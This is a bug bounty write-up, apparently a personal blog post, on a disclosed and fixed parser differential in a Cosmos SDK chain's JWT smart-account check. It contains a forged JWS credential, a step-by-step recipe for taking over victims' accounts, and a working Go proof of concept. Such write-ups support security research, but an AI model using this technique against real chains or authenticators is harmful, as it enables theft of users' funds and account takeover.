+++
date = '2026-09-30T00:34:09+03:00'
draft = false
title = 'Forging Transactions on a Cosmos SDK Chain'
description = "A parser differential in a smart account's JWT check that let me forge transactions for other users' accounts and landed me $150,000"
tags = [
    "Cosmos SDK",
    "Bug Bounty",
	"Reward",
]
categories = [
    "Bug Bounty",
]
+++

{{< box info >}}
This article was written with the help of Claude Opus 5.5.
{{< /box >}}

Last year, I wanted to learn Cosmos SDK ecosystem. I believe one of the best ways to learn a new technology be it a programming language, a development framework or a new blockchain, is to actually go ahead and hack it (I know you cannot hack programming languages but you can find vulnerability classes prominent in that programming language). Just reading how things work, for the sake of learning never worked for me. I need to give myself a purpose to learn new stuff. This is the power of bug bounties for me. It helped me learn so many different technologies and interact with so many different ecosystems while getting paid and enjoying the process. The high I get from finding a critical feels like an addiction. I enjoy the chase more than the money to be honest. This is how I found this bug.

One night, after work, I was sitting at my desk and opened the Immunefi dashboard. I searched for Cosmos SDK programs to hack on. At the time, I was familiar with EVM and its inner workings due to my daily work but I have never interacted with Cosmos SDK blockchains before. Knowing how to select a target is the most important part of the bug bounty process. I wanted to find a blockchain project that was relatively new on Immunefi, had a good payout for criticals and was using some novel/niche technology on top of Cosmos SDK. This is how I found this blockchain project that shall not be named.

#### Analyzing the Cosmos SDK Modules

The target blockchain I selected used custom Cosmos SDK modules. If you aren't familiar with the Cosmos SDK ecosystem, Cosmos allows extending the blockchain with modules for custom use-cases. There are default modules that come with the Cosmos SDK such as `x/bank` or `x/staking`, these modules are about transfer of tokens or staking. But a blockchain might need more functionality than just transferring tokens such as adding a custom bridge or supporting EVM transactions. The custom modules go into the `x/` folder. This isn't a primer on Cosmos SDK modules and how they work, so if you are interested in how they work I would highly suggest reading [the official introduction to Cosmos SDK modules](https://docs.cosmos.network/sdk/v0.53/build/building-modules/intro).

Pretty early on in my analysis, the `x/abstractaccount` module caught my attention. This module is the chain's implementation of account abstraction. In a vanilla Cosmos SDK chain, an account is a public key and a transaction is valid if it carries a valid signature from the matching private key. That's it. With account abstraction, the account is a smart contract and the contract itself decides what counts as a valid "signature". If you are coming from the EVM world like me, think of ERC-4337 smart accounts, except the logic is wired into the chain itself instead of living behind an entry point contract and a bundler.

![Regular account](/images/cosmos-transaction-forgery/regular-account.png)

![Abstract account](/images/cosmos-transaction-forgery/abstract-account.png)

Why did this catch my attention? Because the most security critical question a blockchain answers is "is this transaction really coming from the owner of this account?". With this module, the chain hands that question over to a smart contract, and the contract answers it with custom code. Custom authentication code, written for a niche feature, on a relatively new chain. Nice :) 

#### How the abstract account module works

The module is [open source](https://github.com/larry0x/abstract-account) and its README explains the idea pretty well. There are three moving parts: a contract that acts as the account, a message that turns a contract into an account, and an ante handler that asks the contract to authenticate transactions. Let's go over them one by one.

##### The contract

Smart contracts on Cosmos chains usually run on CosmWasm, where contracts are written in Rust and compiled to WebAssembly. A smart contract account (SCA) is a regular CosmWasm contract that implements two `sudo` methods, `before_tx` and `after_tx`:

```rust
enum SudoMsg {
    BeforeTx {
        msgs:       Vec<Any>,
        tx_bytes:   Binary,
        cred_bytes: Option<Binary>,
        simulate:   bool,
    },
    AfterTx {
        simulate: bool,
    },
}
```

{{< box info >}}
`sudo` is a special CosmWasm entry point. Users cannot call it with a regular transaction, only the chain's native modules can. So when a contract's `sudo` handler runs, you know the call is coming from the chain itself.
{{< /box >}}

##### Turning a contract into an account

The contract's code is uploaded to the chain like any other CosmWasm contract and gets a code ID, which new contract instances are created from. But not every contract can become an account. The module keeps a list of allowed code IDs in its params and only governance can change it. To create an account from an allowed code ID, you send a `MsgRegisterAccount` and the module does three things:

1. The contract is instantiated from the allowed code ID.
2. The contract is set as its own admin, so only the account itself can migrate its code.
3. The contract's entry in `x/auth`, the module that keeps track of accounts, is overwritten with an `AbstractAccount`. Unlike a normal account, it has no public key. From the chain's point of view, it's an account that can send transactions but has no key to sign them with.

Here's how a user ends up with one of these accounts using a JWT, in simple terms:

![Account creation flow](/images/cosmos-transaction-forgery/account-creation.png)

So how does the chain decide whether a transaction from this account is legit?

##### The ante handler

Every Cosmos SDK transaction goes through the ante handler before its messages are executed. It's a chain of decorators, each doing a single job: checking fees, validating the memo, verifying signatures, increasing the sequence number and so on. The target chain replaces the default signature verification decorator with the module's `BeforeTxDecorator`.

`BeforeTxDecorator` checks whether the transaction has exactly one signer and whether that signer is an `AbstractAccount`. If not, it falls back to the default signature verification. If it is, it builds a `before_tx` message and calls the account contract's `sudo` entry point. Here is a trimmed version of the [decorator](https://github.com/larry0x/abstract-account/blob/main/x/abstractaccount/ante.go):

```go
func (d BeforeTxDecorator) AnteHandle(ctx sdk.Context, tx sdk.Tx, simulate bool, next sdk.AnteHandler) (newCtx sdk.Context, err error) {
	isAbstractAccountTx, signerAcc, sig, err := IsAbstractAccountTx(ctx, tx, d.ak)
	// ...
	if !isAbstractAccountTx {
		svd := authante.NewSigVerificationDecorator(d.ak, d.signModeHandler)
		return svd.AnteHandle(ctx, tx, simulate, next)
	}
	// ...
	signBytes, sigBytes, err := prepareCredentials(ctx, tx, signerAcc, sig.Data, d.signModeHandler)
	// ...
	sudoMsgBytes, err := json.Marshal(&types.AccountSudoMsg{
		BeforeTx: &types.BeforeTx{
			Msgs:      msgAnys,
			TxBytes:   signBytes,
			CredBytes: sigBytes,
			Simulate:  simulate,
		},
	})
	// ...
	if err := sudoWithGasLimit(ctx, d.aak.ContractKeeper(), signerAcc.GetAddress(), sudoMsgBytes, params.MaxGasBefore); err != nil {
		return ctx, err
	}

	return next(ctx, tx, simulate)
}
```

Two fields matter here:

* `tx_bytes` are the sign bytes of the transaction, the same bytes a regular wallet would sign. They include the messages, the fee, the chain ID, the account number and the sequence number. Since the sequence number goes up with every transaction, no two transactions from an account have the same sign bytes, and hashing them gives you a unique fingerprint of the transaction.
* `cred_bytes` is whatever sits in the transaction's signature field, passed along as is. For a normal account, it would be a signature. For an SCA, it's whatever the contract wants it to be.

If `before_tx` returns an error, the transaction is rejected. If the transaction goes through, a post handler (`AfterTxDecorator`) calls `after_tx` the same way:

```
            start
              ↓
    ┌───────────────────┐
    │     before_tx     │  <- authentication happens here
    └───────────────────┘
              ↓
    ┌───────────────────┐
    │        tx         │
    └───────────────────┘
              ↓
    ┌───────────────────┐
    │     after_tx      │
    └───────────────────┘
              ↓
            done
```

One important detail: `cred_bytes` is fully controlled by whoever submits the transaction.

#### The account contract and the JWT authenticator

The target chain has its own account contract implementing these hooks. An account can have multiple "authenticators" registered to it and any one of them can authorize a transaction:

```rust
pub enum Authenticator {
    Secp256K1 { pubkey: Binary },
    Ed25519 { pubkey: Binary },
    EthWallet { address: String },
    Jwt { aud: String, sub: String },
    Secp256R1 { pubkey: Binary },
    Passkey { url: String, passkey: Binary },
}
```

Many of these are interesting on their own. A vanilla Cosmos chain only gives you `Secp256K1` keys, while here you can also control your account with an Ethereum wallet or a passkey. But all of them, except one, verify a signature over the transaction itself. The one that stood out to me was `Jwt`. It lets users control their account with a JWT issued by an identity provider. So they can log in with their email or social account and never deal with seed phrases. Great UX, but there is a catch. A JWT proves *who* you are, not *what* you want to do.

To bind a JWT to a specific transaction, the token carries a custom claim called `transaction_hash`, which is the SHA-256 hash of the transaction the user wants to authorize. That's what makes a token single-use: the hash covers the sequence number, so once that transaction lands, no other transaction will ever have the same hash. On top of that, the authenticator stores the expected values of two standard claims: `aud`, the app the token was issued for, and `sub`, the user's ID at the identity provider. A token only counts for an account if both match. A decoded JWT payload looks like this:

```json
{
  "aud": ["integration-test-project"],
  "exp": 1747313454,
  "iat": 1747313149,
  "iss": "integration-test-project",
  "nbf": 1747313149,
  "sub": "integration-test-user",
  "transaction_hash": "V50z+b6XrcOovH5OHaC5GCNJehoJs4NWPDUGWurmbk4="
}
```

Let's follow a JWT-authenticated transaction through the contract. When the transaction comes in, the chain calls `before_tx`. The first byte of `cred_bytes` is the index of the authenticator to use and the rest is the actual credential. For the `Jwt` authenticator, that's the JWT string itself:

```rust
pub fn before_tx(deps: Deps, env: &Env, tx_bytes: &Binary, cred_bytes: Option<&Binary>, simulate: bool) -> ContractResult<Response> {
    // ...
    // the first byte of the signature is the index of the authenticator
    let cred_index: u8 = match cred_bytes.first() { /* ... */ };
    // retrieve the authenticator by index, or error
    let authenticator = AUTHENTICATORS.load(deps.storage, cred_index)?;
    let sig_bytes = &Binary::from(&cred_bytes.as_slice()[1..]);
    // ...
    return match authenticator.verify(deps, env, tx_bytes, sig_bytes)? // ...
}
```

The `Jwt` authenticator hashes the transaction and calls `jwt::verify` with the hash, the JWT and the stored `aud` and `sub`:

```rust
Authenticator::Jwt { aud, sub } => {
    let tx_bytes_hash = util::sha256(tx_bytes);
    jwt::verify(deps, &tx_bytes_hash, sig_bytes.as_slice(), aud, sub)
}
```

And here is `jwt::verify`, the star of this post:

```rust
pub fn verify(
    deps: Deps,
    tx_hash: &Vec<u8>,
    sig_bytes: &[u8],
    aud: &str,
    sub: &str,
) -> ContractResult<bool> {
    let query = QueryValidateJwtRequest {
        aud: aud.to_string(),
        sub: sub.to_string(),
        sig_bytes: String::from_utf8(sig_bytes.into())?,
    };

    let query_bz = query.to_bytes()?;
    deps.querier.query_grpc(
        String::from("/<redacted>.jwk.v1.Query/ValidateJWT"),
        Binary::new(query_bz),
    )?;

    // at this point we have validated the JWT. Any custom claims on it's body
    // can follow
    let mut components = sig_bytes.split(|&b| b == b'.');
    components.next().ok_or(InvalidToken)?; // ignore the header, it is not currently used
    let payload_bytes = components.next().ok_or(InvalidToken)?;
    let payload = URL_SAFE_NO_PAD.decode(payload_bytes)?;
    let claims: Claims = cosmwasm_std::from_json(payload.as_slice())?;

    // make sure the provided hash matches the one from the tx
    if tx_hash.eq(&claims.transaction_hash) {
        Ok(true)
    } else {
        Err(InvalidSignatureDetail { /* ... */ })
    }
}
```

It does two things:

1. It asks the chain to validate the JWT. The chain has another custom module, `x/jwk`, which stores the public keys (JWKs) of registered audiences and exposes a `ValidateJWT` gRPC query. That query checks the signature, the `aud` and `sub` claims and the time based claims like `exp` and `nbf`. If anything is off, the query fails and so does the transaction.
2. If the chain is happy with the token, the contract parses the JWT on its own, pulls out the `transaction_hash` claim and compares it with the hash of the current transaction.

Look at how the work is split. The chain checks that the token is legit. The contract checks that the token is for *this* transaction. Nobody checks both. As long as both of them are looking at the same token, that's fine.

#### The bug

Take another look at how the contract extracts the payload. Do you see the problem?

```rust
    let mut components = sig_bytes.split(|&b| b == b'.');
```

The contract assumes that the JWT is always in the good old `header.payload.signature` format. It splits the input on `.`, throws away the first part and decodes the second part as the payload. It doesn't check that there are exactly three parts. It doesn't check that the input even looks like a JWT. It relies on the chain's validation for all of that.

At first, this sounds reasonable. The `ValidateJWT` query validated the exact same bytes, right? If those bytes weren't a well-formed JWT, the query would have failed. So the contract only ever sees well-formed JWTs.

Well-formed according to whom?

#### JWS JSON Serialization

A signed JWT is a JWS (JSON Web Signature) and [RFC 7515](https://datatracker.ietf.org/doc/html/rfc7515) defines *two* ways to serialize a JWS. The one everybody knows is the **JWS Compact Serialization**: three base64url encoded parts delimited by two dots.

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOlsiaW50ZWdyYXRpb24tdGVzdC1wcm9qZWN0Il0sImV4cCI6MTc0NzMxMzQ1NCwiaWF0IjoxNzQ3MzEzMTQ5LCJpc3MiOiJpbnRlZ3JhdGlvbi10ZXN0LXByb2plY3QiLCJuYmYiOjE3NDczMTMxNDksInN1YiI6ImludGVncmF0aW9uLXRlc3QtdXNlciIsInRyYW5zYWN0aW9uX2hhc2giOiJWNTB6K2I2WHJjT292SDVPSGFDNUdDTkplaG9KczROV1BEVUdXdXJtYms0PSJ9.WGILW8jUUP5MQ67sDP7j5LldALTle42x...
```

The other one is the **JWS JSON Serialization**, which is just, well, JSON. Here is the same token:

```json
{
  "payload": "eyJhdWQiOlsiaW50ZWdyYXRpb24tdGVzdC1wcm9qZWN0Il0s...",
  "signatures": [
    {
      "protected": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9",
      "signature": "WGILW8jUUP5MQ67sDP7j5LldALTle42x..."
    }
  ]
}
```

Same header, same payload, same signature. Just packaged differently. Both represent the exact same signed token and a spec compliant library will verify both of them.

The `x/jwk` module uses [lestrrat-go/jwx](https://github.com/lestrrat-go/jwx) to parse and verify JWTs. And `jwt.Parse` in that library happily accepts both formats. Before parsing, it guesses the format of the input:

```go
func GuessFormat(payload []byte) FormatKind {
	payload = bytes.TrimSpace(payload)
	// ...
	if payload[0] != '{' {
		// Compact format. It's probably a JWS or JWE
		// ...
	}

	// If we got here, we probably have JSON.
	var h formatHint
	if err := json.Unmarshal(payload, &h); err != nil {
		return UnknownFormat
	}
	// ...
	if h.Signatures != nil && h.Payload != nil {
		return JWS
	}
	return UnknownFormat
}
```

If the input starts with `{` and has `payload` and `signatures` fields, it's treated as a JWS in JSON serialization and gets verified like any other token.

So now we have two components reading the same bytes with two different parsers:

* The chain (through jwx) reads it as JSON and verifies whatever is in the `payload` field.
* The contract splits it on dots and reads whatever sits between the first and the second dot.

What happens if the contract receives a legitimate token in JSON form? It has nothing to split on. The JSON is just keys like `payload` and `signatures` plus base64url values, and base64url only uses letters, digits, `-` and `_`. There's no dot anywhere. The whole string comes back as one part, the contract finds no second part to use as the payload, and it rejects the transaction with `InvalidToken`. So a JSON token on its own gets you nowhere. But the contract doesn't care *where* the dots come from.

#### The decoy

Here is the part of RFC 7515 that makes this attack possible, from [section 7.2.1](https://datatracker.ietf.org/doc/html/rfc7515#section-7.2.1):

> Additional members can be present in both the JSON objects defined above; if not understood by implementations encountering them, they MUST be ignored.

So I can add any field I want to the JSON and the library *has to* ignore it. Let's add a field whose value looks like a compact JWT:

```json
{
  "attack": "HEADER.ewogICJ0cmFuc2FjdGlvbl9oYXNoIjogImRSWG95Tkgzci9uUnZjdTcxaGR5UzlPNWdQS09lRzJEcXZWU1I4UzBQZjg9Igp9.SIGNATURE",
  "payload": "<victim's payload>",
  "signatures": [
    {
      "protected": "<victim's header>",
      "signature": "<victim's signature>"
    }
  ]
}
```

The middle part of the `attack` field is a base64url encoded payload that I made up:

```json
{
  "transaction_hash": "dRXoyNH3r/nRvcu71hdyS9O5gPKOeG2DqvVSR8S0Pf8="
}
```

That's the hash of a transaction I built, not one the victim ever saw.

Why not just use my own JWT? The chain checks `aud` and `sub` against the victim's authenticator, so only a token issued to the victim passes. And the identity provider will never sign a token for the victim with my transaction hash in it. Reusing a token the victim already has is the only way in.

Now let's look at this string from both sides.

**The chain** parses it as a JWS JSON Serialization. It ignores the `attack` field just like the RFC says and verifies `payload` and `signatures`, which are the victim's untouched, legitimately signed token. The signature is valid, `aud` and `sub` match, the token hasn't expired. Check passes.

**The contract** splits it on dots:

```
part 0: {"attack": "HEADER                               -> ignored, "header is not currently used"
part 1: ewogICJ0cmFuc2FjdGlvbl9oYXNoIjogImRSWG95...Igp9  -> decoded as the payload
part 2: SIGNATURE", "payload": "eyJhdWQi...", ...        -> never looked at
```

It decodes part 1, finds my `transaction_hash`, compares it with the hash of the transaction I submitted and... they match. Check passes.

The chain verified the victim's signature over the victim's old transaction. The contract verified that a hash I made up matches the transaction I sent. Both are happy and the link between *who signed* and *what was signed* is gone.

#### Forging a transaction

Putting it all together, the attack looks like this:

1. **Grab a token.** Wait for the victim to send any transaction with their JWT authenticator. The credentials are part of the transaction, so the victim's signed JWT is public. You can pull it from the mempool, a block explorer or any RPC node.
2. **Build a malicious transaction.** Anything the victim's account can do. Send all the funds to me, call a contract or add a new authenticator that I control. Then compute the SHA-256 hash of its sign bytes.
3. **Craft the credential.** Take the header, payload and signature from the victim's JWT, repackage them as JWS JSON Serialization and add the decoy field with my transaction hash in the middle. Prefix it with the index of the victim's JWT authenticator.
4. **Submit.** The transaction goes through `before_tx`, both checks pass and the transaction executes on behalf of the victim.

Here is a small Go program that reproduces the core of the bug with the jwx version the chain was using at the time (`v2.0.21`). It signs a token for an "old" transaction, repackages it with a decoy for a "new" transaction and runs both checks:

```go
package main

import (
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"
	"time"

	"github.com/lestrrat-go/jwx/v2/jwa"
	"github.com/lestrrat-go/jwx/v2/jwt"
)

func main() {
	key, _ := rsa.GenerateKey(rand.Reader, 2048)
	oldTx := sha256.Sum256([]byte("victim: some harmless tx"))
	newTx := sha256.Sum256([]byte("attacker: send everything to me"))

	// 1. The victim's legit token, bound to oldTx
	tok := jwt.New()
	tok.Set(jwt.AudienceKey, "project")
	tok.Set(jwt.SubjectKey, "victim")
	tok.Set(jwt.ExpirationKey, time.Now().Add(5*time.Minute))
	tok.Set("transaction_hash", base64.StdEncoding.EncodeToString(oldTx[:]))
	signed, _ := jwt.Sign(tok, jwt.WithKey(jwa.RS256, key))
	parts := strings.Split(string(signed), ".") // header, payload, signature

	// 2. Repackage it as JWS JSON Serialization, plus a decoy bound to newTx
	evil, _ := json.Marshal(map[string]string{
		"transaction_hash": base64.StdEncoding.EncodeToString(newTx[:]),
	})
	forged := fmt.Sprintf(
		`{"attack":"HEADER.%s.SIGNATURE","payload":"%s","signatures":[{"protected":"%s","signature":"%s"}]}`,
		base64.RawURLEncoding.EncodeToString(evil), parts[1], parts[0], parts[2],
	)

	// 3. What the chain does: verify the token
	_, err := jwt.Parse([]byte(forged),
		jwt.WithKey(jwa.RS256, &key.PublicKey),
		jwt.WithAudience("project"),
		jwt.WithSubject("victim"),
		jwt.WithValidate(true),
	)
	fmt.Println("chain says the token is valid:", err == nil)

	// 4. What the contract does: split on '.' and decode the second part
	payload, _ := base64.RawURLEncoding.DecodeString(strings.Split(forged, ".")[1])
	var claims struct {
		TransactionHash []byte `json:"transaction_hash"`
	}
	json.Unmarshal(payload, &claims)
	fmt.Println("contract says the hash matches the new tx:", bytes.Equal(claims.TransactionHash, newTx[:]))
}
```

And the output:

```
chain says the token is valid: true
contract says the hash matches the new tx: true
```

One thing worth mentioning: the chain still validates `exp` against the block time, so the victim's token has to be unexpired when the forged transaction lands. These tokens are short lived, the example token above is valid for about five minutes. That sounds like a limitation but it doesn't buy much. A bot watching every block (or the mempool) for JWT-authenticated transactions can craft and submit a forged transaction within seconds. It doesn't even need to wait for the victim's transaction to be included. It can grab the token from the mempool and race it.

#### Impact

If exploited, an attacker can forge transactions on behalf of any smart account that uses a JWT authenticator. The only requirement is that the victim sends a single transaction. That covers pretty much everyone who signed up with an email or a social login. Concretely:

* **Stealing funds:** transfer all tokens and NFTs held by the victim's account to an attacker controlled address.
* **Arbitrary execution as the victim:** vote on DAO proposals, change ownership or admin roles in contracts controlled by the victim, abuse any contract that trusts the victim's account.
* **Account takeover:** add an authenticator controlled by the attacker and remove the victim's legitimate ones. At this point the attacker doesn't need to race any tokens anymore. The account is theirs, permanently, and the victim is locked out.

Non-consensual execution of arbitrary transactions directly leading to theft of funds, so I reported it as critical.

#### The fix

The team fixed the issue on the chain side by making `ValidateJWT` accept only compact serialized tokens. jwx has an option for exactly this:

```go
jwt.Settings(jwt.WithCompactOnly(true))
token, err := jwt.Parse([]byte(req.SigBytes),
	jwt.WithKey(key.Algorithm(), key),
	jwt.WithAudience(req.Aud),
	// ...
```

With this setting, the forged token is rejected before the contract gets to look at it:

```
failed to parse jws: failed to decode protected headers: failed to decode source: illegal base64 data at input byte 0
```

That closes the hole. But if it were up to me, I would have fixed the contract as well. Remember the `ValidateJWT` query? It doesn't just say yes or no, it also returns the private claims of the verified token, and `transaction_hash` is a private claim. The contract even had a struct ready for the response:

```rust
#[cw_serde]
#[allow(non_snake_case)]
struct QueryValidateJWTResponse {
    privateClaims: Vec<PrivateClaims>,
}
```

...but it threw the response away and parsed the raw bytes all over again. If the contract had read `transaction_hash` from the verified response, there would be nothing to disagree about, since those claims come from the exact payload whose signature was checked. As long as the contract re-parses the raw token on its own, its safety depends on the chain side staying strict. One refactor that relaxes the parsing on the chain side and the bug is back.

#### Takeaways

This is a textbook parser differential: two components look at the same bytes and come to two different conclusions about what they mean. Two things I took away from this one:

* **Verify, then use what you verified.** If you validate something and then parse the raw input again to extract data, you are trusting that both parsers agree on every possible input, not just the inputs you had in mind.
* **Specs are bigger than you think.** Most people (me included, before this bug) know JWTs only as three base64 blobs separated by dots. RFC 7515 has a whole other serialization and spec compliant libraries support it by default.

#### Timeline

* May 15, 2025: Reported
* May 21, 2025: Report confirmed
* May 21, 2025: Fix merged
* July 30, 2025: $150,000 rewarded 
